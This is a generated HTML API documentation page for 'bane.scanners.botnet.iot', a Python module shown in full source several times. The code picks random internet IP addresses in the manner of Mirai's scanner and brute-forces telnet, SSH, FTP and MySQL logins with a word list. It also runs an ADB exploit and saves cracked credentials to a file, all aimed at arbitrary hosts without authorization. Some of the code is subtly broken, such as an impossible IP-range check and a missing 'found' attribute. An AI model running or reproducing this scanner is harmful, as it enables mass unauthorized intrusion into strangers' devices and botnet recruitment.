<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1, minimum-scale=1" name="viewport">
<meta content="pdoc 0.10.0" name="generator"/>
<title>bane.scanners.botnet.iot API documentation</title>
<meta content="" name="description"/>
<link as="style" crossorigin="" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/sanitize.min.css" integrity="sha256-PK9q560IAAa6WVRRh76LtCaI8pjTJ2z11v0miyNNjrs=" rel="preload stylesheet"/>
<link as="style" crossorigin="" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/typography.min.css" integrity="sha256-7l/o7C8jubJiy74VsKTidCy1yBkRtiUGbVkYBylBqUg=" rel="preload stylesheet"/>
<link as="style" crossorigin="" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/github.min.css" rel="stylesheet preload"/>
<style>:root{--highlight-color:#fe9}.flex{display:flex !important}body{line-height:1.5em}#content{padding:20px}#sidebar{padding:30px;overflow:hidden}#sidebar > *:last-child{margin-bottom:2cm}.http-server-breadcrumbs{font-size:130%;margin:0 0 15px 0}#footer{font-size:.75em;padding:5px 30px;border-top:1px solid #ddd;text-align:right}#footer p{margin:0 0 0 1em;display:inline-block}#footer p:last-child{margin-right:30px}h1,h2,h3,h4,h5{font-weight:300}h1{font-size:2.5em;line-height:1.1em}h2{font-size:1.75em;margin:1em 0 .50em 0}h3{font-size:1.4em;margin:25px 0 10px 0}h4{margin:0;font-size:105%}h1:target,h2:target,h3:target,h4:target,h5:target,h6:target{background:var(--highlight-color);padding:.2em 0}a{color:#058;text-decoration:none;transition:color .3s ease-in-out}a:hover{color:#e82}.title code{font-weight:bold}h2[id^="header-"]{margin-top:2em}.ident{color:#900}pre code{background:#f8f8f8;font-size:.8em;line-height:1.4em}code{background:#f2f2f1;padding:1px 4px;overflow-wrap:break-word}h1 code{background:transparent}pre{background:#f8f8f8;border:0;border-top:1px solid #ccc;border-bottom:1px solid #ccc;margin:1em 0;padding:1ex}#http-server-module-list{display:flex;flex-flow:column}#http-server-module-list div{display:flex}#http-server-module-list dt{min-width:10%}#http-server-module-list p{margin-top:0}.toc ul,#index{list-style-type:none;margin:0;padding:0}#index code{background:transparent}#index h3{border-bottom:1px solid #ddd}#index ul{padding:0}#index h4{margin-top:.6em;font-weight:bold}@media (min-width:200ex){#index .two-column{column-count:2}}@media (min-width:300ex){#index .two-column{column-count:3}}dl{margin-bottom:2em}dl dl:last-child{margin-bottom:4em}dd{margin:0 0 1em 3em}#header-classes + dl > dd{margin-bottom:3em}dd dd{margin-left:2em}dd p{margin:10px 0}.name{background:#eee;font-weight:bold;font-size:.85em;padding:5px 10px;display:inline-block;min-width:40%}.name:hover{background:#e0e0e0}dt:target .name{background:var(--highlight-color)}.name > span:first-child{white-space:nowrap}.name.class > span:nth-child(2){margin-left:.4em}.inherited{color:#999;border-left:5px solid #eee;padding-left:1em}.inheritance em{font-style:normal;font-weight:bold}.desc h2{font-weight:400;font-size:1.25em}.desc h3{font-size:1em}.desc dt code{background:inherit}.source summary,.git-link-div{color:#666;text-align:right;font-weight:400;font-size:.8em;text-transform:uppercase}.source summary > *{white-space:nowrap;cursor:pointer}.git-link{color:inherit;margin-left:1em}.source pre{max-height:500px;overflow:auto;margin:0}.source pre code{font-size:12px;overflow:visible}.hlist{list-style:none}.hlist li{display:inline}.hlist li:after{content:',\2002'}.hlist li:last-child:after{content:none}.hlist .hlist{display:inline;padding-left:1em}img{max-width:100%}td{padding:0 .5em}.admonition{padding:.1em .5em;margin-bottom:1em}.admonition-title{font-weight:bold}.admonition.note,.admonition.info,.admonition.important{background:#aef}.admonition.todo,.admonition.versionadded,.admonition.tip,.admonition.hint{background:#dfd}.admonition.warning,.admonition.versionchanged,.admonition.deprecated{background:#fd4}.admonition.error,.admonition.danger,.admonition.caution{background:lightpink}</style>
<style media="screen and (min-width: 700px)">@media screen and (min-width:700px){#sidebar{width:30%;height:100vh;overflow:auto;position:sticky;top:0}#content{width:70%;max-width:100ch;padding:3em 4em;border-left:1px solid #ddd}pre code{font-size:1em}.item .name{font-size:1em}main{display:flex;flex-direction:row-reverse;justify-content:flex-end}.toc ul ul,#index ul{padding-left:1.5em}.toc > ul > li{margin-top:.5em}}</style>
<style media="print">@media print{#sidebar h1{page-break-before:always}.source{display:none}}@media print{*{background:transparent !important;color:#000 !important;box-shadow:none !important;text-shadow:none !important}a[href]:after{content:" (" attr(href) ")";font-size:90%}a[href][title]:after{content:none}abbr[title]:after{content:" (" attr(title) ")"}.ir a:after,a[href^="javascript:"]:after,a[href^="#"]:after{content:""}pre,blockquote{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}tr,img{page-break-inside:avoid}img{max-width:100% !important}@page{margin:0.5cm}p,h2,h3{orphans:3;widows:3}h1,h2,h3,h4,h5,h6{page-break-after:avoid}}</style>
<script crossorigin="" defer="" integrity="sha256-Uv3H6lx7dJmRfRvH8TH6kJD1TSK1aFcwgx+mdg3epi8=" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js"></script>
<script>window.addEventListener('DOMContentLoaded', () => hljs.initHighlighting())</script>
</meta></head>
<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>bane.scanners.botnet.iot</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">import os, sys, socket, random, time, threading, xtelnet
from bane.common.payloads import *
from bane.scanners.vulnerabilities.vulns import adb_exploit, exposed_telnet
from ftplib import FTP

from bane.bruteforce.hydra import *
from bane.utils.handle_files import write_file


def getip():
    """
    this function was inspired by the scanning file in mirai's source code to returns a safe IP to bruteforce."""
    d = [3, 6, 7, 10, 11, 15, 16, 21, 22, 23, 26, 28, 29, 30, 33, 55, 56, 127, 214, 215]
    f = [100, 169, 172, 198]
    while True:
        o1 = random.randint(1, 253)
        o2 = random.randint(0, 254)
        if o1 not in d:
            if o1 in f:
                if (o1 == 192) and (o2 != 168):
                    return "{}.{}.{}.{}".format(
                        o1, o2, random.randint(0, 255), random.randint(0, 255)
                    )
                if (o1 == 172) and ((o2 &lt;= 16) and (o2 &gt;= 32)):
                    return "{}.{}.{}.{}".format(
                        o1, o2, random.randint(0, 255), random.randint(0, 255)
                    )
                if (o1 == 100) and (o2 != 64):
                    return "{}.{}.{}.{}".format(
                        o1, o2, random.randint(0, 255), random.randint(0, 255)
                    )
                if (o1 == 169) and (o2 != 254):
                    return "{}.{}.{}.{}".format(
                        o1, o2, random.randint(0, 255), random.randint(0, 255)
                    )
                if (o1 == 198) and (o2 != 18):
                    return "{}.{}.{}.{}".format(
                        o1, o2, random.randint(0, 255), random.randint(0, 255)
                    )
            else:
                return "{}.{}.{}.{}".format(
                    o1, o2, random.randint(0, 255), random.randint(0, 255)
                )


"""
  the following functions are used to scan safe IPs all over the internet with a word_list, it can scan bruteforce their: ftp, ssh, telnet, smtp and mysql logins then save them on text files in the same directory.
  it's highly recommended to be used with a VPS or your slow internet speed will be an obstacle to your scan.
"""


class mass_scan:
    def __init__(
        self,
        file_name="results.csv",
        protocol="telnet",
        telnet_bots=True,
        threads_daemon=True,
        logs=True,
        threads=100,
        word_list=[],
        ip_range=None,
        timeout=7,
        p=23,
    ):
        self.word_list = word_list
        self.logs = logs
        self.protocol = protocol.lower()
        self.stop = False
        self.ip_range = ip_range
        self.timeout = timeout
        self.port = p
        self.result = []
        self.telnet_bots = telnet_bots
        self.file_name = file_name
        if os.path.exists(self.file_name) == False:
            write_file("protocol,ip,port,username,password", self.file_name)
        for x in range(threads):
            t = threading.Thread(target=self.scan)
            t.daemon = threads_daemon
            t.start()

    def scan(self):
        try:
            time.sleep(1)
            while True:
                try:
                    if self.stop == True:
                        break
                    if self.ip_range == None:
                        ip = getip()
                    else:
                        ip = self.ip_range.format(
                            random.randint(0, 255),
                            random.randint(0, 255),
                            random.randint(0, 255),
                            random.randint(0, 255),
                        )
                    i = False
                    try:
                        so = socket.socket()
                        so.settimeout(self.timeout)
                        so.connect((ip, self.port))
                        i = True
                        so.close()
                    except:
                        pass
                    if self.stop == True:
                        break
                    if i == True:
                        if self.protocol == "adb":
                            q = adb_exploit(ip, timeout=self.timeout, p=self.port)
                            if q == True:
                                res = "adb:{}:{}::".format(ip, self.port)
                                write_file(res, self.file_name)
                                self.result.append(res)
                                if self.logs == True:
                                    print(res)
                        else:
                            if self.protocol == "ssh":
                                func = ssh
                            elif self.protocol == "telnet":
                                func = telnet
                            elif self.protocol == "ftp":
                                func = ftp
                            elif self.protocol == "mysql":
                                func = mysql
                            for x in self.word_list:
                                if self.stop == True:
                                    break
                                try:
                                    username = x.split(":")[0]
                                    password = x.split(":")[1]
                                    if (
                                        self.protocol == "telnet"
                                        and self.telnet_bots == True
                                    ):
                                        q = func(
                                            ip,
                                            username,
                                            password,
                                            timeout=self.timeout,
                                            p=self.port,
                                            bot_mode=True,
                                        )
                                    else:
                                        q = func(
                                            ip,
                                            username,
                                            password,
                                            timeout=self.timeout,
                                            p=self.port,
                                        )
                                    if q == True:
                                        res = "{},{},{},{},{}".format(
                                            self.protocol,
                                            ip,
                                            self.port,
                                            username,
                                            password,
                                        )
                                        write_file(res, self.file_name)
                                        self.result.append(res)
                                        if self.logs == True:
                                            print(res)
                                        break
                                except:
                                    pass
                except:
                    pass
            self.kill()
        except:
            pass

    def done(self):
        if "stop" in dir(self):
            return False
        return True

    def reset(self):
        l = []
        for x in self.__dict__:
            self.__dict__[x] = None
            l.append(x)
        for x in l:
            delattr(self, x)

    def kill(self):
        self.stop = True
        a = self.__dict__["found"]
        self.reset()  # this will kill any running threads instantly by setting all the attacking information to "None" and cause error which is handled with the "try...except..." around the main while loop
        return a</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-functions">Functions</h2>
<dl>
<dt id="bane.scanners.botnet.iot.getip"><code class="name flex">
<span>def <span class="ident">getip</span></span>(<span>)</span>
</code></dt>
<dd>
<div class="desc"><p>this function was inspired by the scanning file in mirai's source code to returns a safe IP to bruteforce.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def getip():
    """
    this function was inspired by the scanning file in mirai's source code to returns a safe IP to bruteforce."""
    d = [3, 6, 7, 10, 11, 15, 16, 21, 22, 23, 26, 28, 29, 30, 33, 55, 56, 127, 214, 215]
    f = [100, 169, 172, 198]
    while True:
        o1 = random.randint(1, 253)
        o2 = random.randint(0, 254)
        if o1 not in d:
            if o1 in f:
                if (o1 == 192) and (o2 != 168):
                    return "{}.{}.{}.{}".format(
                        o1, o2, random.randint(0, 255), random.randint(0, 255)
                    )
                if (o1 == 172) and ((o2 &lt;= 16) and (o2 &gt;= 32)):
                    return "{}.{}.{}.{}".format(
                        o1, o2, random.randint(0, 255), random.randint(0, 255)
                    )
                if (o1 == 100) and (o2 != 64):
                    return "{}.{}.{}.{}".format(
                        o1, o2, random.randint(0, 255), random.randint(0, 255)
                    )
                if (o1 == 169) and (o2 != 254):
                    return "{}.{}.{}.{}".format(
                        o1, o2, random.randint(0, 255), random.randint(0, 255)
                    )
                if (o1 == 198) and (o2 != 18):
                    return "{}.{}.{}.{}".format(
                        o1, o2, random.randint(0, 255), random.randint(0, 255)
                    )
            else:
                return "{}.{}.{}.{}".format(
                    o1, o2, random.randint(0, 255), random.randint(0, 255)
                )</code></pre>
</details>
</dd>
</dl>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="bane.scanners.botnet.iot.mass_scan"><code class="flex name class">
<span>class <span class="ident">mass_scan</span></span>
<span>(</span><span>file_name='results.csv', protocol='telnet', telnet_bots=True, threads_daemon=True, logs=True, threads=100, word_list=[], ip_range=None, timeout=7, p=23)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class mass_scan:
    def __init__(
        self,
        file_name="results.csv",
        protocol="telnet",
        telnet_bots=True,
        threads_daemon=True,
        logs=True,
        threads=100,
        word_list=[],
        ip_range=None,
        timeout=7,
        p=23,
    ):
        self.word_list = word_list
        self.logs = logs
        self.protocol = protocol.lower()
        self.stop = False
        self.ip_range = ip_range
        self.timeout = timeout
        self.port = p
        self.result = []
        self.telnet_bots = telnet_bots
        self.file_name = file_name
        if os.path.exists(self.file_name) == False:
            write_file("protocol,ip,port,username,password", self.file_name)
        for x in range(threads):
            t = threading.Thread(target=self.scan)
            t.daemon = threads_daemon
            t.start()

    def scan(self):
        try:
            time.sleep(1)
            while True:
                try:
                    if self.stop == True:
                        break
                    if self.ip_range == None:
                        ip = getip()
                    else:
                        ip = self.ip_range.format(
                            random.randint(0, 255),
                            random.randint(0, 255),
                            random.randint(0, 255),
                            random.randint(0, 255),
                        )
                    i = False
                    try:
                        so = socket.socket()
                        so.settimeout(self.timeout)
                        so.connect((ip, self.port))
                        i = True
                        so.close()
                    except:
                        pass
                    if self.stop == True:
                        break
                    if i == True:
                        if self.protocol == "adb":
                            q = adb_exploit(ip, timeout=self.timeout, p=self.port)
                            if q == True:
                                res = "adb:{}:{}::".format(ip, self.port)
                                write_file(res, self.file_name)
                                self.result.append(res)
                                if self.logs == True:
                                    print(res)
                        else:
                            if self.protocol == "ssh":
                                func = ssh
                            elif self.protocol == "telnet":
                                func = telnet
                            elif self.protocol == "ftp":
                                func = ftp
                            elif self.protocol == "mysql":
                                func = mysql
                            for x in self.word_list:
                                if self.stop == True:
                                    break
                                try:
                                    username = x.split(":")[0]
                                    password = x.split(":")[1]
                                    if (
                                        self.protocol == "telnet"
                                        and self.telnet_bots == True
                                    ):
                                        q = func(
                                            ip,
                                            username,
                                            password,
                                            timeout=self.timeout,
                                            p=self.port,
                                            bot_mode=True,
                                        )
                                    else:
                                        q = func(
                                            ip,
                                            username,
                                            password,
                                            timeout=self.timeout,
                                            p=self.port,
                                        )
                                    if q == True:
                                        res = "{},{},{},{},{}".format(
                                            self.protocol,
                                            ip,
                                            self.port,
                                            username,
                                            password,
                                        )
                                        write_file(res, self.file_name)
                                        self.result.append(res)
                                        if self.logs == True:
                                            print(res)
                                        break
                                except:
                                    pass
                except:
                    pass
            self.kill()
        except:
            pass

    def done(self):
        if "stop" in dir(self):
            return False
        return True

    def reset(self):
        l = []
        for x in self.__dict__:
            self.__dict__[x] = None
            l.append(x)
        for x in l:
            delattr(self, x)

    def kill(self):
        self.stop = True
        a = self.__dict__["found"]
        self.reset()  # this will kill any running threads instantly by setting all the attacking information to "None" and cause error which is handled with the "try...except..." around the main while loop
        return a</code></pre>
</details>
<h3>Methods</h3>
<dl>
<dt id="bane.scanners.botnet.iot.mass_scan.done"><code class="name flex">
<span>def <span class="ident">done</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def done(self):
    if "stop" in dir(self):
        return False
    return True</code></pre>
</details>
</dd>
<dt id="bane.scanners.botnet.iot.mass_scan.kill"><code class="name flex">
<span>def <span class="ident">kill</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def kill(self):
    self.stop = True
    a = self.__dict__["found"]
    self.reset()  # this will kill any running threads instantly by setting all the attacking information to "None" and cause error which is handled with the "try...except..." around the main while loop
    return a</code></pre>
</details>
</dd>
<dt id="bane.scanners.botnet.iot.mass_scan.reset"><code class="name flex">
<span>def <span class="ident">reset</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def reset(self):
    l = []
    for x in self.__dict__:
        self.__dict__[x] = None
        l.append(x)
    for x in l:
        delattr(self, x)</code></pre>
</details>
</dd>
<dt id="bane.scanners.botnet.iot.mass_scan.scan"><code class="name flex">
<span>def <span class="ident">scan</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def scan(self):
    try:
        time.sleep(1)
        while True:
            try:
                if self.stop == True:
                    break
                if self.ip_range == None:
                    ip = getip()
                else:
                    ip = self.ip_range.format(
                        random.randint(0, 255),
                        random.randint(0, 255),
                        random.randint(0, 255),
                        random.randint(0, 255),
                    )
                i = False
                try:
                    so = socket.socket()
                    so.settimeout(self.timeout)
                    so.connect((ip, self.port))
                    i = True
                    so.close()
                except:
                    pass
                if self.stop == True:
                    break
                if i == True:
                    if self.protocol == "adb":
                        q = adb_exploit(ip, timeout=self.timeout, p=self.port)
                        if q == True:
                            res = "adb:{}:{}::".format(ip, self.port)
                            write_file(res, self.file_name)
                            self.result.append(res)
                            if self.logs == True:
                                print(res)
                    else:
                        if self.protocol == "ssh":
                            func = ssh
                        elif self.protocol == "telnet":
                            func = telnet
                        elif self.protocol == "ftp":
                            func = ftp
                        elif self.protocol == "mysql":
                            func = mysql
                        for x in self.word_list:
                            if self.stop == True:
                                break
                            try:
                                username = x.split(":")[0]
                                password = x.split(":")[1]
                                if (
                                    self.protocol == "telnet"
                                    and self.telnet_bots == True
                                ):
                                    q = func(
                                        ip,
                                        username,
                                        password,
                                        timeout=self.timeout,
                                        p=self.port,
                                        bot_mode=True,
                                    )
                                else:
                                    q = func(
                                        ip,
                                        username,
                                        password,
                                        timeout=self.timeout,
                                        p=self.port,
                                    )
                                if q == True:
                                    res = "{},{},{},{},{}".format(
                                        self.protocol,
                                        ip,
                                        self.port,
                                        username,
                                        password,
                                    )
                                    write_file(res, self.file_name)
                                    self.result.append(res)
                                    if self.logs == True:
                                        print(res)
                                    break
                            except:
                                pass
            except:
                pass
        self.kill()
    except:
        pass</code></pre>
</details>
</dd>
</dl>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a href="index.md" title="bane.scanners.botnet">bane.scanners.botnet</a></code></li>
</ul>
</li>
<li><h3><a href="#header-functions">Functions</a></h3>
<ul class="">
<li><code><a href="#bane.scanners.botnet.iot.getip" title="bane.scanners.botnet.iot.getip">getip</a></code></li>
</ul>
</li>
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a href="#bane.scanners.botnet.iot.mass_scan" title="bane.scanners.botnet.iot.mass_scan">mass_scan</a></code></h4>
<ul class="">
<li><code><a href="#bane.scanners.botnet.iot.mass_scan.done" title="bane.scanners.botnet.iot.mass_scan.done">done</a></code></li>
<li><code><a href="#bane.scanners.botnet.iot.mass_scan.kill" title="bane.scanners.botnet.iot.mass_scan.kill">kill</a></code></li>
<li><code><a href="#bane.scanners.botnet.iot.mass_scan.reset" title="bane.scanners.botnet.iot.mass_scan.reset">reset</a></code></li>
<li><code><a href="#bane.scanners.botnet.iot.mass_scan.scan" title="bane.scanners.botnet.iot.mass_scan.scan">scan</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
</footer>
</body>
</html>